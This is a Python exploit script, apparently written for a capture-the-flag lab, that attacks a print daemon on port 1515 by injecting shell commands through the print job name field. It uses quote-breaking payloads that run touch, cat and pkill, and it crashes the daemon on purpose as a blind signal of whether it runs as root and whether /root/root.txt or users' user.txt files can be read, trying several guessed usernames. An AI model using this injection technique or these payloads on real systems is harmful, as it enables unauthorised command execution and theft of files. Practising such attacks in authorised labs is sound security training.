#!/usr/bin/env python3
import socket, time

T = '10.129.38.158'

def lpd(jn, t=8):
    s=socket.socket();s.settimeout(t)
    try:
        s.connect((T,1515));s.send(b'\x02archive_intake')
        time.sleep(0.15);s.recv(1024)
        ct=(f'J{jn}\n').encode()
        s.send(b'\x01\x00\x00\x00\n'+str(len(ct)).encode()+b'\n'+ct)
        time.sleep(0.3);s.recv(4096)
    except: pass
    finally: s.close()

def alive():
    s=socket.socket();s.settimeout(2)
    try:
        s.connect((T,1515));s.send(b'\x03');d=s.recv(4096);s.close();return True
    except: return False

# Test 1: Is daemon running as root?
print('Test 1: Daemon runs as root?', flush=True)
lpd("';touch /root/root_test 2>/dev/null && pkill -f server.py;echo '")
time.sleep(0.3)
a = alive()
print(f'  Daemon alive after root test: {a}', flush=True)
if not a:
    print('  *** YES! Daemon runs as ROOT ***', flush=True)
    for _ in range(20):
        time.sleep(0.5)
        if alive(): break
else:
    print('  No - daemon does not run as root', flush=True)

# Test 2: Can daemon read /home/*/user.txt?
time.sleep(2)
print('\nTest 2: Can read flag?', flush=True)
lpd("';c=$(cat /home/*/user.txt 2>/dev/null);test -n \"$c\" && pkill -f server.py;echo '")
time.sleep(0.3)
a = alive()
print(f'  Daemon alive after flag test: {a}', flush=True)
if not a:
    print('  *** YES! Flag is readable! ***', flush=True)
else:
    print('  No - flag not readable via wildcard', flush=True)
    # Try individual paths
    for u in ['dave','paper','paperwork','lp','nobody','archivist','admin']:
        lpd(f"';cat /home/{u}/user.txt 2>/dev/null | head -c 3 > /tmp/fc;test -s /tmp/fc && pkill -f server.py;echo '")
        time.sleep(0.3)
        if not alive():
            print(f'  Found readable flag at /home/{u}/user.txt!', flush=True)
            for _ in range(20):
                time.sleep(0.5)
                if alive(): break
            break
    else:
        print('  No readable user flag found', flush=True)
        for _ in range(5):
            if alive(): break
            time.sleep(1)
        lpd("';cat /root/root.txt 2>/dev/null | head -c 3 > /tmp/fc;test -s /tmp/fc && pkill -f server.py;echo '")
        time.sleep(0.3)
        if not alive():
            print('  Can read /root/root.txt!', flush=True)
        else:
            print('  Cannot read root flag either', flush=True)

print('\nDone', flush=True)
